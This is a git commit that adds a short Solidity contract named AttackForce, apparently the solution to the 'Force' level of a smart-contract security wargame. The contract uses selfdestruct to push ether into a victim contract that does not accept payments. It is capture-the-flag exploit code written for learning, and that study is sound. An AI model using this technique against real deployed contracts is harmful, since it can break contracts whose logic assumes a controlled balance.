026c4b1b7b86920e443e9976d17c60fcab92915d
alex0207s <alex640702070829@gmail.com>
2023-05-13 23:14:12 +0800

    :white_check_mark: Add level 7 Force solution
    :white_check_mark: Add level 7 Force solution

---
+++ src/levels/07-Force/AttackForce.sol
@@ -0,0 +1,8 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+contract AttackForce {
+  function attack(address _victim) external payable {
+    selfdestruct(payable(address(_victim)));
+  }
+}
